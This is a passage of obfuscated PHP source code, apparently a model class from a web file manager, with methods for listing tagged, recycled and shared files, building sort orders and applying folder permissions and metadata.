($ì£ê˜˜¯ as &$ÓÀ§óå) { $ÓÀ§óå = array($ËÕÚø•Ÿ[419] => $ÓÀ§óå[$ËÕÚø•Ÿ[399]], $ËÕÚø•Ÿ[420] => $ÓÀ§óå[$ËÕÚø•Ÿ[32]], $ËÕÚø•Ÿ[421] => $ÓÀ§óå[$ËÕÚø•Ÿ[84]], $ËÕÚø•Ÿ[422] => $ÓÀ§óå[$ËÕÚø•Ÿ[33]], $ËÕÚø•Ÿ[423] => $ÓÀ§óå[$ËÕÚø•Ÿ[200]], $ËÕÚø•Ÿ[424] => $ÓÀ§óå[$ËÕÚø•Ÿ[85]]); if ($ÓÀ§óå[$ËÕÚø•Ÿ[33]] == $ËÕÚø•Ÿ[416] && $¥¢¡Öõú[$ÓÀ§óå[$ËÕÚø•Ÿ[84]]]) { $ÓÀ§óå[$ËÕÚø•Ÿ[86]] = $¥¢¡Öõú[$ÓÀ§óå[$ËÕÚø•Ÿ[84]]]; } } unset($ÓÀ§óå); return $ì£ê˜˜¯; } public function listUserTag($£Ğ§®’€) { $»×´€±– =& $_SERVER[ùÆÎÔ“Ñ]; if ($£Ğ§®’€ && !is_array($£Ğ§®’€)) { $£Ğ§®’€ = array($£Ğ§®’€); } $¤ó‘ğŞ = Model($»×´€±–[425])->listData(); $°ˆù¿©š = array(); $½¹ò£· = array(); foreach ($¤ó‘ğŞ as $ş‡àãâº) { $—ËÎ„£› = $ş‡àãâº[$»×´€±–[84]]; if (!$—ËÎ„£›) { continue; } if (!isset($½¹ò£·[$—ËÎ„£›])) { $½¹ò£·[$—ËÎ„£›] = array(); } $½¹ò£·[$—ËÎ„£›][] = $ş‡àãâº[$»×´€±–[426]]; $°ˆù¿©š[$ş‡àãâº[$»×´€±–[84]]] = $ş‡àãâº; } $ƒ¿à‚•ö = array(); $ÕÓÃÇ°“ = array(); $‹˜‘­â˜ = array(); foreach ($½¹ò£· as $Å­µ»›ë => $ÊÌ­‡æø) { $­Ô›¾ø¬ = !0; if (!$£Ğ§®’€) { $ƒ¿à‚•ö[] = $Å­µ»›ë; continue; } foreach ($£Ğ§®’€ as $ñğ«íŠ) { if (!in_array($ñğ«íŠ, $ÊÌ­‡æø)) { $­Ô›¾ø¬ = !1; break; } } if (!$­Ô›¾ø¬) { continue; } if (!is_numeric($Å­µ»›ë)) { $¼½ˆ‹ÜÑ = $°ˆù¿©š[$Å­µ»›ë]; $‰Œé¾£  = array($»×´€±–[32] => $¼½ˆ‹ÜÑ[$»×´€±–[32]], $»×´€±–[84] => $¼½ˆ‹ÜÑ[$»×´€±–[84]], $»×´€±–[33] => $¼½ˆ‹ÜÑ[$»×´€±–[33]], $»×´€±–[86] => array($»×´€±–[427] => 1), $»×´€±–[201] => !0); if ($¼½ˆ‹ÜÑ[$»×´€±–[33]] == $»×´€±–[199]) { $‹˜‘­â˜[] = $‰Œé¾£ ; } if ($¼½ˆ‹ÜÑ[$»×´€±–[33]] == $»×´€±–[75]) { $ÕÓÃÇ°“[] = $‰Œé¾£ ; } continue; } $ƒ¿à‚•ö[] = $Å­µ»›ë; } if ($ƒ¿à‚•ö) { $Ü„®ãóÂ = $this->listSource(array($»×´€±–[417] => array($»×´€±–[418], $ƒ¿à‚•ö))); } $Ü„®ãóÂ = $Ü„®ãóÂ ? $Ü„®ãóÂ : array($»×´€±–[82] => array(), $»×´€±–[83] => array()); $Ü„®ãóÂ[$»×´€±–[82]] = array_merge($Ü„®ãóÂ[$»×´€±–[82]], $ÕÓÃÇ°“); $Ü„®ãóÂ[$»×´€±–[83]] = array_merge($Ü„®ãóÂ[$»×´€±–[83]], $‹˜‘­â˜); if (isset($Ü„®ãóÂ[$»×´€±–[366]]) && count($ƒ¿à‚•ö) == $Ü„®ãóÂ[$»×´€±–[366]][$»×´€±–[367]]) { return $Ü„®ãóÂ; } $ÑÂµòô = array(); $µà¢™ùÍ = array_to_keyvalue($Ü„®ãóÂ[$»×´€±–[82]], $»×´€±–[12], $»×´€±–[402]); $«Ë•òş = array_to_keyvalue($Ü„®ãóÂ[$»×´€±–[83]], $»×´€±–[12], $»×´€±–[402]); $ª¨Üé£ù = array_merge($«Ë•òş, $µà¢™ùÍ); foreach ($ƒ¿à‚•ö as $—ËÎ„£›) { if (!in_array($—ËÎ„£›, $ª¨Üé£ù)) { $ÑÂµòô[] = $—ËÎ„£›; } } if ($ÑÂµòô) { Model($»×´€±–[428])->removeBySource($ÑÂµòô); } return $Ü„®ãóÂ; } public function listUserRecycle() { $¦Èş‡‰ =& $_SERVER[ùÆÎÔ“Ñ]; $ĞŸ±æ£Ç = Model($¦Èş‡‰[429])->listData(); if (!$ĞŸ±æ£Ç) { return array(); } $ Ë¶£ï› = array($¦Èş‡‰[417] => array($¦Èş‡‰[418], $ĞŸ±æ£Ç), $¦Èş‡‰[430] => 1); return $this->listSource($ Ë¶£ï›); } public function listSource($˜Ó•×Ìˆ, $¾‘ÑşÍº = 3000, $°©íŒê’ = false) { $ğÁ¯æåÆ =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($˜Ó•×Ìˆ[$ğÁ¯æåÆ[431]])) { $˜Ó•×Ìˆ[$ğÁ¯æåÆ[431]] = 0; } if (isset($˜Ó•×Ìˆ[$ğÁ¯æåÆ[432]]) && $˜Ó•×Ìˆ[$ğÁ¯æåÆ[432]] == $ğÁ¯æåÆ[197]) { $˜Ó•×Ìˆ[$ğÁ¯æåÆ[412]] = array($ğÁ¯æåÆ[331], $ğÁ¯æåÆ[433]); } $œø×êÙ  = $ğÁ¯æåÆ[434]; $ÄòĞ’÷ğ = $this->field($œø×êÙ )->_makeOrder()->where($˜Ó•×Ìˆ)->selectPage($¾‘ÑşÍº); $this->_listPageCheck($ÄòĞ’÷ğ, $œø×êÙ , $˜Ó•×Ìˆ); $this->_listDataApply($ÄòĞ’÷ğ[$ğÁ¯æåÆ[369]], $°©íŒê’); $this->_listMake($ÄòĞ’÷ğ); return $ÄòĞ’÷ğ; } private function _listPageCheck(&$´³†íÊÍ, $„ò˜û“, $õË·ëÓ¾) { $û£ÕïÁ– =& $_SERVER[ùÆÎÔ“Ñ]; if (!is_array($´³†íÊÍ[$û£ÕïÁ–[366]])) { return; } $¤¬Ì…èı = $´³†íÊÍ[$û£ÕïÁ–[366]]; if ($¤¬Ì…èı[$û£ÕïÁ–[368]] <= 1) { return; } if ($¤¬Ì…èı[$û£ÕïÁ–[367]] >= 100000) { return; } if (Model($û£ÕïÁ–[435])->get($û£ÕïÁ–[436]) != $û£ÕïÁ–[437]) { return; } $„ò˜û“ = str_replace(array($û£ÕïÁ–[53], $û£ÕïÁ–[342], $û£ÕïÁ–[231]), $û£ÕïÁ–[12], $„ò˜û“); $„ò˜û“ = $û£ÕïÁ–[438] . str_replace($û£ÕïÁ–[50], $û£ÕïÁ–[439], $„ò˜û“) . $û£ÕïÁ–[440]; $ãÜäÙ´Ô = $û£ÕïÁ–[441]; $ãÜäÙ´Ô = $ãÜäÙ´Ô . $û£ÕïÁ–[442]; $´ëÁ‘®ç = $¤¬Ì…èı[$û£ÕïÁ–[363]] * ($¤¬Ì…èı[$û£ÕïÁ–[353]] - 1) . $û£ÕïÁ–[50] . $¤¬Ì…èı[$û£ÕïÁ–[363]]; $£”‘°é± = $this->_makeOrder(!0); $œÖ©À = $û£ÕïÁ–[438] . str_replace($û£ÕïÁ–[50], $û£ÕïÁ–[439], $£”‘°é±[0]); if (strpos($œÖ©À, $û£ÕïÁ–[443])) { $œÖ©À = str_replace($û£ÕïÁ–[443], $û£ÕïÁ–[444], $œÖ©À); } else { $œÖ©À .= $û£ÕïÁ–[445] . $£”‘°é±[1]; } $ÜÑúßÇ = array(); foreach ($õË·ëÓ¾ as $…—Û¥èä => $€˜ò£’) { $ÜÑúßÇ[$û£ÕïÁ–[438] . $…—Û¥èä] = $€˜ò£’; } $this->alias($û£ÕïÁ–[446])->field($„ò˜û“)->limit($´ëÁ‘®ç)->order($œÖ©À); $µïœ = $this->join($ãÜäÙ´Ô)->where($ÜÑúßÇ)->select(); if ($µïœ) { $´³†íÊÍ[$û£ÕïÁ–[369]] = $µïœ; } } protected function _makeOrder($ôŠÖÉÈ¬ = false) { $Ç»àØ•É =& $_SERVER[ùÆÎÔ“Ñ]; $•Ï°æÛ = Model($Ç»àØ•É[447])->get($Ç»àØ•É[448]); $±»àØ•í = Model($Ç»àØ•É[447])->get($Ç»àØ•É[449]); $˜—Ì½·÷ = array($Ç»àØ•É[450] => $Ç»àØ•É[451], $Ç»àØ•É[452] => $Ç»àØ•É[453]); $€ı’šéŸ = array($Ç»àØ•É[32] => $Ç»àØ•É[32], $Ç»àØ•É[76] => $Ç»àØ•É[76], $Ç»àØ•É[174] => $Ç»àØ•É[412], $Ç»àØ•É[454] => $Ç»àØ•É[454], $Ç»àØ•É[455] => $Ç»àØ•É[456], $Ç»àØ•É[200] => $Ç»àØ•É[200], $Ç»àØ•É[85] => $Ç»àØ•É[85]); $í×ŞŠÇÅ = Input::get($Ç»àØ•É[457], $Ç»àØ•É[7], $•Ï°æÛ, array_keys($€ı’šéŸ)); $ĞÎíæ±£ = Input::get($Ç»àØ•É[458], $Ç»àØ•É[7], $±»àØ•í, array_keys($˜—Ì½·÷)); if (!in_array($í×ŞŠÇÅ, array_keys($€ı’šéŸ))) { $í×ŞŠÇÅ = $Ç»àØ•É[32]; } if (!in_array($ĞÎíæ±£, array_keys($˜—Ì½·÷))) { $í×ŞŠÇÅ = $Ç»àØ•É[450]; } if ($í×ŞŠÇÅ == $Ç»àØ•É[32]) { } $æüÁĞÚˆ = $Ç»àØ•É[459] . $€ı’šéŸ[$í×ŞŠÇÅ] . $Ç»àØ•É[53] . $˜—Ì½·÷[$ĞÎíæ±£]; $æüÁĞÚˆ = rtrim(trim($æüÁĞÚˆ), $Ç»àØ•É[50]); if ($ôŠÖÉÈ¬) { return array($æüÁĞÚˆ, $˜—Ì½·÷[$ĞÎíæ±£]); } return $this->order($æüÁĞÚˆ); } protected function _listDataApplyItem($é³˜«º€, $Ü×Üõê‹ = false) { $Ü³îæ± = array($é³˜«º€); $this->_listDataApply($Ü³îæ±, $Ü×Üõê‹); return $Ü³îæ±[0]; } protected function _listDataApply(&$ŸÓ×ã»è, $–·Äáüó = false) { $²•Ôì²© =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ŸÓ×ã»è) { $ŸÓ×ã»è = array(); return; } $àšìÜ = array_to_keyvalue($ŸÓ×ã»è, $²•Ôì²©[12], $²•Ôì²©[402]); $àšìÜ = array_unique($àšìÜ); $this->_listSourceCache($ŸÓ×ã»è); if (!$–·Äáüó) { $this->_listAppendMeta($ŸÓ×ã»è, $àšìÜ); $this->_listAppendFileMeta($ŸÓ×ã»è, $àšìÜ); $this->_listAppendChildren($ŸÓ×ã»è, $àšìÜ); } $this->_listAppendPath($ŸÓ×ã»è); $this->_listAppendAuth($ŸÓ×ã»è); $this->_listAppendSourceInfo($ŸÓ×ã»è, $àšìÜ); $this->_listAppendUser($ŸÓ×ã»è); $this->_listFilterInfo($ŸÓ×ã»è, $–·Äáüó); $this->_listAppendAuthSecret($ŸÓ×ã»è); } protected function _listSourceCache($¬ş»Ô±) { $ÙÛÆûÊ¢ =& $_SERVER[ùÆÎÔ“Ñ]; foreach ($¬ş»Ô± as $Û¾Íåˆ¦) { self::$cacheSourceInfo[$ÙÛÆûÊ¢[460] . $Û¾Íåˆ¦[$ÙÛÆûÊ¢[402]]] = $Û¾Íåˆ¦; } } protected function _listFilterInfo(&$÷ê¾íÁô, $âÔŸŒ  = false) { $ßËò²Ê¨ =& $_SERVER[ùÆÎÔ“Ñ]; foreach ($÷ê¾íÁô as &$ÍÙøøå’) { $ÍÙøøå’ = $this->pathInfoFilter($ÍÙøøå’); self::$cachePathInfo[$ßËò²Ê¨[461] . intval($âÔŸŒ ) . $ßËò²Ê¨[386] . $ÍÙøøå’[$ßËò²Ê¨[402]]] = $ÍÙøøå’; } unset($ÍÙøøå’); } protected function _listMake(&$€Âóìš­) { $É‡©Õô =& $_SERVER[ùÆÎÔ“Ñ]; $€Âóìš­[$É‡©Õô[82]] = array(); $€Âóìš­[$É‡©Õô[83]] = array(); foreach ($€Âóìš­[$É‡©Õô[369]] as $ÊÏğ˜³) { $Ä­ÛĞƒˆ = $ÊÏğ˜³[$É‡©Õô[410]] == 1 ? $É‡©Õô[82] : $É‡©Õô[83]; $€Âóìš­[$Ä­ÛĞƒˆ][] = $ÊÏğ˜³; } unset($€Âóìš­[$É‡©Õô[369]]); } protected function _listAppendMeta(&$ßÔÎ—Êò, $„âÏ’¾À) { $›ÅÈ§¶ğ =& $_SERVER[ùÆÎÔ“Ñ]; $Ğ¬¤±Ï = array($›ÅÈ§¶ğ[417] => array($›ÅÈ§¶ğ[418], $„âÏ’¾À)); $ˆ¦³÷»‚ = Model($›ÅÈ§¶ğ[462])->field($›ÅÈ§¶ğ[463])->where($Ğ¬¤±Ï)->select(); if (!$ˆ¦³÷»‚) { return; } $æÒšÇœø = array($›ÅÈ§¶ğ[464], $›ÅÈ§¶ğ[465], $›ÅÈ§¶ğ[444]); $¿ğùî÷ = array(); foreach ($ˆ¦³÷»‚ as $ÍŠØÔÙ·) { if (!isset($¿ğùî÷[$ÍŠØÔÙ·[$›ÅÈ§¶ğ[402]]])) { $¿ğùî÷[$ÍŠØÔÙ·[$›ÅÈ§¶ğ[402]]] = array(); } if (in_array($ÍŠØÔÙ·[$›ÅÈ§¶ğ[94]], $æÒšÇœø)) { continue; } $¿ğùî÷[$ÍŠØÔÙ·[$›ÅÈ§¶ğ[402]]][$ÍŠØÔÙ·[$›ÅÈ§¶ğ[94]]] = $ÍŠØÔÙ·[$›ÅÈ§¶ğ[374]]; } foreach ($ßÔÎ—Êò as &$‰ø“‰Õ) { $‰ø“‰Õ[$›ÅÈ§¶ğ[466]] = !1; if (isset($¿ğùî÷[$‰ø“‰Õ[$›ÅÈ§¶ğ[402]]])) { $‰ø“‰Õ[$›ÅÈ§¶ğ[466]] = $¿ğùî÷[$‰ø“‰Õ[$›ÅÈ§¶ğ[402]]]; } if ($this->fileIsLock($‰ø“‰Õ) && $‰ø“‰Õ[$›ÅÈ§¶ğ[413]]) { $¦Ö†·Ùú = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‰ø“‰Õ[$›ÅÈ§¶ğ[413]][$›ÅÈ§¶ğ[414]] = AuthModel::authDisable($‰ø“‰Õ[$›ÅÈ§¶ğ[413]][$›ÅÈ§¶ğ[414]], $¦Ö†·Ùú); $‰ø“‰Õ[$›ÅÈ§¶ğ[413]][$›ÅÈ§¶ğ[467]][$›ÅÈ§¶ğ[413]] = $‰ø“‰Õ[$›ÅÈ§¶ğ[413]][$›ÅÈ§¶ğ[414]]; } } unset($‰ø“‰Õ); } protected function _listAppendFileMeta(&$å±ñ, $€Ó¥ÍÉå) { $±çå€ =& $_SERVER[ùÆÎÔ“Ñ]; $±Ö×ŸîÑ = array_to_keyvalue($å±ñ, $±çå€[12], $±çå€[468]); $±Ö×ŸîÑ = array_filter(array_unique($±Ö×ŸîÑ)); if (!$±Ö×ŸîÑ) { return; } $ã€€¾æ§ = array($±çå€[469] => array($±çå€[418], $±Ö×ŸîÑ)); $° ûú©³ = $±çå€[470]; $¿İÁË°ó = Model($±çå€[471])->field($° ûú©³)->where($ã€€¾æ§)->select(); $¿İÁË°ó = array_to_keyvalue($¿İÁË°ó, $±çå€[468]); $¿í×‚ ä = Model($±çå€[472])->field($±çå€[473])->where($ã€€¾æ§)->select(); $¿í×‚ ä = $¿í×‚ ä ? $¿í×‚ ä : array(); $è‹É­‹’ = array(); foreach ($¿í×‚ ä as $ÖéäÎÛ) { if (!isset($è‹É­‹’[$ÖéäÎÛ[$±çå€[468]]])) { $è‹É­‹’[$ÖéäÎÛ[$±çå€[468]]] = array(); } $è‹É­‹’[$ÖéäÎÛ[$±çå€[468]]][$ÖéäÎÛ[$±çå€[94]]] = $ÖéäÎÛ[$±çå€[374]]; } foreach ($å±ñ as &$½˜Ğßğé) { $¯úÊåğ¿ = $½˜Ğßğé[$±çå€[468]]; if (!$¯úÊåğ¿ || !is_array($¿İÁË°ó[$¯úÊåğ¿])) { continue; } $Áê¸Ğó· = $¿İÁË°ó[$¯úÊåğ¿]; $Áê¸Ğó·[$±çå€[76]] = $½˜Ğßğé[$±çå€[76]]; $Áê¸Ğó·[$±çå€[32]] = $½˜Ğßğé[$±çå€[32]]; if (!isset(self::$cacheFileInfo[$±çå€[474] . $¯úÊåğ¿])) { self::$cacheFileInfo[$±çå€[474] . $¯úÊåğ¿] = array_merge(array(), $Áê¸Ğó·); } unset($¿İÁË°ó[$¯úÊåğ¿][$±çå€[84]]); $ñçñ›şê = is_array($è‹É­‹’[$¯úÊåğ¿]) ? $è‹É­‹’[$¯úÊåğ¿] : array(); $½˜Ğßğé[$±çå€[170]] = array_merge($ñçñ›şê, $¿İÁË°ó[$¯úÊåğ¿]); if (isset($½˜Ğßğé[$±çå€[170]][$±çå€[169]])) { $½˜Ğßğé[$±çå€[169]] = json_decode($½˜Ğßğé[$±çå€[170]][$±çå€[169]], !0); unset($½˜Ğßğé[$±çå€[170]][$±çå€[169]]); } } unset($½˜Ğßğé); } protected function _listAppendSourceInfo(&$„Œƒ¦Ú³, $â¡ÖãÌ“) { $»¾Ò‘õÜ =& $_SERVER[ùÆÎÔ“Ñ]; if (!defined($»¾Ò‘õÜ[475])) { return; } $ÀÒÏ‡üá = Model($»¾Ò‘õÜ[476])->listData(); $ÄßËı = Model($»¾Ò‘õÜ[425])->listData(); $ÅÌ¨ö = Model($»¾Ò‘õÜ[415])->listData(); $áÙ›ææî = Model($»¾Ò‘õÜ[477])->listSimple(); $ÂÈ²Ç¼¬ = array_to_keyvalue($ÀÒÏ‡üá, $»¾Ò‘õÜ[399]); $Í´ˆ»»ƒ = array_to_keyvalue_group($ÄßËı, $»¾Ò‘õÜ[84], $»¾Ò‘õÜ[426]); $ßª’Ú = array_to_keyvalue($ÅÌ¨ö, $»¾Ò‘õÜ[84]); $ıèòÜ¨¶ = array_to_keyvalue_group($áÙ›ææî, $»¾Ò‘õÜ[402]); foreach ($„Œƒ¦Ú³ as &$âÓ —Ÿ³) { $âÓ —Ÿ³[$»¾Ò‘õÜ[86]] = array($»¾Ò‘õÜ[478] => 0, $»¾Ò‘õÜ[479] => 0, $»¾Ò‘õÜ[480] => 0); if (isset($ßª’Ú[$âÓ —Ÿ³[$»¾Ò‘õÜ[402]]])) { $âÓ —Ÿ³[$»¾Ò‘õÜ[86]][$»¾Ò‘õÜ[481]] = 1; $âÓ —Ÿ³[$»¾Ò‘õÜ[86]][$»¾Ò‘õÜ[482]] = $ßª’Ú[$âÓ —Ÿ³[$»¾Ò‘õÜ[402]]][$»¾Ò‘õÜ[32]]; } if ($Í´ˆ»»ƒ && $ÂÈ²Ç¼¬ && isset($Í´ˆ»»ƒ[$âÓ —Ÿ³[$»¾Ò‘õÜ[402]]])) { $âÓ —Ÿ³[$»¾Ò‘õÜ[86]][$»¾Ò‘õÜ[483]] = array(); foreach ($Í´ˆ»»ƒ[$âÓ —Ÿ³[$»¾Ò‘õÜ[402]]] as $Èú«ÇÙÄ) { $éºö›õë = $ÂÈ²Ç¼¬[$Èú«ÇÙÄ]; $âÓ —Ÿ³[$»¾Ò‘õÜ[86]][$»¾Ò‘õÜ[483]][] = array($»¾Ò‘õÜ[484] => $éºö›õë[$»¾Ò‘õÜ[399]], $»¾Ò‘õÜ[420] => $éºö›õë[$»¾Ò‘õÜ[32]], $»¾Ò‘õÜ[485] => $éºö›õë[$»¾Ò‘õÜ[486]]); } } if ($ıèòÜ¨¶ && isset($ıèòÜ¨¶[$âÓ —Ÿ³[$»¾Ò‘õÜ[402]]])) { $âÓ —Ÿ³[$»¾Ò‘õÜ[86]][$»¾Ò‘õÜ[487]] = array(); foreach ($ıèòÜ¨¶[$âÓ —Ÿ³[$»¾Ò‘õÜ[402]]] as $£¥´ëœ) { $âÓ —Ÿ³[$»¾Ò‘õÜ[86]][$»¾Ò‘õÜ[487]] = array($»¾Ò‘õÜ[488] => $£¥´ëœ[$»¾Ò‘õÜ[489]], $»¾Ò‘õÜ[490] => $£¥´ëœ[$»¾Ò‘õÜ[491]], $»¾Ò‘õÜ[492] => $£¥´ëœ[$»¾Ò‘õÜ[402]], $»¾Ò‘õÜ[493] => $£¥´ëœ[$»¾Ò‘õÜ[494]], $»¾Ò‘õÜ[495] => $£¥´ëœ[$»¾Ò‘õÜ[496]], $»¾Ò‘õÜ[497] => $£¥´ëœ[$»¾Ò‘õÜ[497]], $»¾Ò‘õÜ[498] => $£¥´ëœ[$»¾Ò‘õÜ[498]]); } } } unset($âÓ —Ÿ³); return $„Œƒ¦Ú³; } protected function _listAppendChildren(&$´´ñÂ„‚, $Ğ¥°¡•³) { $¹ãÖ­¿ =& $_SERVER[ùÆÎÔ“Ñ]; $Ü†îÍœÜ = array(); $Ë—ÇÅ«Ä = array($¹ãÖ­¿[207] => 0, $¹ãÖ­¿[208] => 0); foreach ($´´ñÂ„‚ as &$…ÅèÊ’Ï) { if (!$…ÅèÊ’Ï[$¹ãÖ­¿[410]]) { continue; } $Ü†îÍœÜ[] = $…ÅèÊ’Ï[$¹ãÖ­¿[402]]; } unset($…ÅèÊ’Ï); if (!$Ü†îÍœÜ) { return; } $§Ê³•Ø = array($¹ãÖ­¿[432] => array($¹ãÖ­¿[7], $Ü†îÍœÜ), $¹ãÖ­¿[431] => 0); $®™İ¨õ = array($¹ãÖ­¿[432], $¹ãÖ­¿[410], $¹ãÖ­¿[499] => $¹ãÖ­¿[500]); $‰Ÿ±Ê¿ = $this->field($®™İ¨õ)->where($§Ê³•Ø)->group($¹ãÖ­¿[501])->select(); $ë·®ïµŞ = array(); foreach ($‰Ÿ±Ê¿ as $ôò¦•ğ) { $ø³¥–Õ = $ôò¦•ğ[$¹ãÖ­¿[432]]; $¡øÊ¿˜ = $ôò¦•ğ[$¹ãÖ­¿[410]] == $¹ãÖ­¿[88] ? $¹ãÖ­¿[208] : $¹ãÖ­¿[207]; if (!isset($ë·®ïµŞ[$ø³¥–Õ])) { $ë·®ïµŞ[$ø³¥–Õ] = array($¹ãÖ­¿[207] => 0, $¹ãÖ­¿[208] => 0); } $ë·®ïµŞ[$ø³¥–Õ][$¡øÊ¿˜] += $ôò¦•ğ[$¹ãÖ­¿[500]]; } foreach ($´´ñÂ„‚ as &$…ÅèÊ’Ï) { if (!$…ÅèÊ’Ï[$¹ãÖ­¿[410]]) { continue; } $ñ¬­Íı¡ = is_array($ë·®ïµŞ[$…ÅèÊ’Ï[$¹ãÖ­¿[402]]]) ? $ë·®ïµŞ[$…ÅèÊ’Ï[$¹ãÖ­¿[402]]] : $Ë—ÇÅ«Ä; $…ÅèÊ’Ï[$¹ãÖ­¿[208]] = $ñ¬­Íı¡[$¹ãÖ­¿[208]]; $…ÅèÊ’Ï[$¹ãÖ­¿[207]] = $ñ¬­Íı¡[$¹ãÖ­¿[207]]; unset($…ÅèÊ’Ï[$¹ãÖ­¿[412]]); } unset($…ÅèÊ’Ï); } protected function _listAppendAuth(&$éíĞ¨ƒÇ) { $êüÁ­ıó =& $_SERVER[ùÆÎÔ“Ñ]; if (!defined($êüÁ­ıó[475])) { return; } $Ù³ğ•Á‹ = array(); foreach ($éíĞ¨ƒÇ as $ó·ĞÜñô) { if ($ó·ĞÜñô[$êüÁ­ıó[411]] == self::TYPE_GROUP) { $Ù³ğ•Á‹[] = $ó·ĞÜñô[$êüÁ­ıó[402]]; } } if (!$Ù³ğ•Á‹) { return; } $ÜôÃ¤„ö = array_to_keyvalue($éíĞ¨ƒÇ, $êüÁ­ıó[402]); $¼’ Ñ•÷ = Model($êüÁ­ıó[502])->getSourceList($Ù³ğ•Á‹, $ÜôÃ¤„ö); $ÒŒŒÄÑˆ = $GLOBALS[$êüÁ­ıó[503]] == 1; foreach ($éíĞ¨ƒÇ as $…óóÈÜä => &$ó·ĞÜñô) { $ó·ĞÜñô[$êüÁ­ıó[413]] = $¼’ Ñ•÷[$ó·ĞÜñô[$êüÁ­ıó[402]]]; if (!$ó·ĞÜñô[$êüÁ­ıó[413]] && $ó·ĞÜñô[$êüÁ­ıó[411]] == self::TYPE_GROUP) { $ó·ĞÜñô[$êüÁ­ıó[413]] = Action($êüÁ­ıó[504])->pathGroupAuthMake($ó·ĞÜñô[$êüÁ­ıó[505]]); if (!$ó·ĞÜñô[$êüÁ­ıó[413]] && !$ÒŒŒÄÑˆ) { $ó·ĞÜñô[$êüÁ­ıó[202]] = !1; $ó·ĞÜñô[$êüÁ­ıó[201]] = !1; } } if ($ó·ĞÜñô[$êüÁ­ıó[413]]) { $ó·ĞÜñô[$êüÁ­ıó[202]] = AuthModel::authCheckEdit($ó·ĞÜñô[$êüÁ­ıó[413]][$êüÁ­ıó[414]]); $ó·ĞÜñô[$êüÁ­ıó[201]] = AuthModel::authCheckView($ó·ĞÜñô[$êüÁ­ıó[413]][$êüÁ­ıó[414]]); } $this->groupPathDisplay($ó·ĞÜñô); } unset($ó·ĞÜñô); } public function _listAppendAuthSecret(&$ñÕø¨”€) { $îòóõ•â =& $_SERVER[ùÆÎÔ“Ñ]; if (Model($îòóõ•â[435])->get($îòóõ•â[506]) != $îòóõ•â[88]) { return; } static $‘©®ù€¿ = false; if (!$‘©®ù€¿) { $ÃÙÅÉƒö = Model($îòóõ•â[507]); $‡£ËŠœ = Model($îòóõ•â[508]); $‘©®ù€¿ = $‡£ËŠœ->listData(); $‘©®ù€¿ = array_to_keyvalue($‘©®ù€¿, $îòóõ•â[402]); $˜Œ“îó½ = json_decode(Model($îòóõ•â[435])->get($îòóõ•â[509]), !0); $˜Œ“îó½ = array_to_keyvalue($˜Œ“îó½, $îòóõ•â[399]); foreach ($‘©®ù€¿ as $çĞ€ºÕ± => $°ğÅ£í) { $ÏËÙ–ª = $˜Œ“îó½[$°ğÅ£í[$îòóõ•â[510]]]; if (!$ÏËÙ–ª) { $‡£ËŠœ->remove($°ğÅ£í[$îòóõ•â[399]]); unset($‘©®ù€¿[$çĞ€ºÕ±]); continue; } $€ÅÙà‹ª = $ÃÙÅÉƒö->listData($ÏËÙ–ª[$îòóõ•â[413]]); if (!$€ÅÙà‹ª) { $‡£ËŠœ->remove($°ğÅ£í[$îòóõ•â[399]]); unset($‘©®ù€¿[$çĞ€ºÕ±]); continue; } $°ğÅ£í[$îòóõ•â[413]] = $€ÅÙà‹ª; $°ğÅ£í[$îòóõ•â[511]] = $ÏËÙ–ª; $°ğÅ£í[$îòóõ•â[512]] = Model($îòóõ•â[513])->getInfoSimpleOuter($°ğÅ£í[$îòóõ•â[454]]); $‘©®ù€¿[$çĞ€ºÕ±] = $°ğÅ£í; } } $Ë»ô»ÌÜ = defined($îòóõ•â[514]) ? USER_ID : $îòóõ•â[12]; $ã¸—Ùß = array(); $æ¤ùÜ = $this->_listAppendPath($ã¸—Ùß, !0); foreach ($ñÕø¨”€ as $çĞ€ºÕ± => &$°ğÅ£í) { if (!is_array($°ğÅ£í[$îòóõ•â[413]])) { continue; } if ($°ğÅ£í[$îòóõ•â[411]] != $îòóõ•â[515]) { continue; } if (isset($‘©®ù€¿[$°ğÅ£í[$îòóõ•â[402]]])) { $ïãØĞŞĞ = $‘©®ù€¿[$°ğÅ£í[$îòóõ•â[402]]]; if (!is_array($°ğÅ£í[$îòóõ•â[466]])) { $°ğÅ£í[$îòóõ•â[466]] = array(); } $°ğÅ£í[$îòóõ•â[466]][$îòóõ•â[516]] = $ïãØĞŞĞ[$îòóõ•â[510]]; $°ğÅ£í[$îòóõ•â[413]][$îòóõ•â[517]] = $ïãØĞŞĞ; $°ğÅ£í[$îòóõ•â[413]][$îòóõ•â[518]] = $°ğÅ£í[$îòóõ•â[519]]; $°ğÅ£í[$îòóõ•â[413]][$îòóõ•â[520]] = $îòóõ•â[88]; if ($ïãØĞŞĞ[$îòóõ•â[454]] != $Ë»ô»ÌÜ) { $°ğÅ£í[$îòóõ•â[413]][$îòóõ•â[414]] = $°ğÅ£í[$îòóõ•â[413]][$îòóõ•â[414]] & $ïãØĞŞĞ[$îòóõ•â[413]][$îòóõ•â[413]]; } continue; } $à›Ê£–‹ = $this->parentLevelArray($°ğÅ£í[$îòóõ•â[521]]); $ÒÊŠ°‡¡ = array_reverse($à›Ê£–‹); foreach ($ÒÊŠ°‡¡ as $€Ù‘°½è => $˜È£øºó) { if (!isset($‘©®ù€¿[$˜È£øºó])) { continue; } $ïãØĞŞĞ = $‘©®ù€¿[$˜È£øºó]; $°ğÅ£í[$îòóõ•â[413]][$îòóõ•â[517]] = $ïãØĞŞĞ; if ($ïãØĞŞĞ[$îòóõ•â[454]] != $Ë»ô»ÌÜ) { $°ğÅ£í[$îòóõ•â[413]][$îòóõ•â[414]] = $°ğÅ£í[$îòóõ•â[413]][$îòóõ•â[414]] & $ïãØĞŞĞ[$îòóõ•â[413]][$îòóõ•â[413]]; } $ÃÏ‰¬ç§ = $îòóõ•â[12]; $§ı¸â¶Á = count($à›Ê£–‹) - $€Ù‘°½è; for ($ü¬¥Øúû = 0; $ü¬¥Øúû < $§ı¸â¶Á; $ü¬¥Øúû++) { if (!isset($æ¤ùÜ[$à›Ê£–‹[$ü¬¥Øúû]])) { $ÃÏ‰¬ç§ = $îòóõ•â[12]; break; } $ÃÏ‰¬ç§ = $ÃÏ‰¬ç§ . rtrim($æ¤ùÜ[$à›Ê£–‹[$ü¬¥Øúû]], $îòóõ•â[8]) . $îòóõ•â[8]; } $°ğÅ£í[$îòóõ•â[413]][$îòóõ•â[518]] = rtrim($ÃÏ‰¬ç§, $îòóõ•â[8]) . $îòóõ•â[8]; 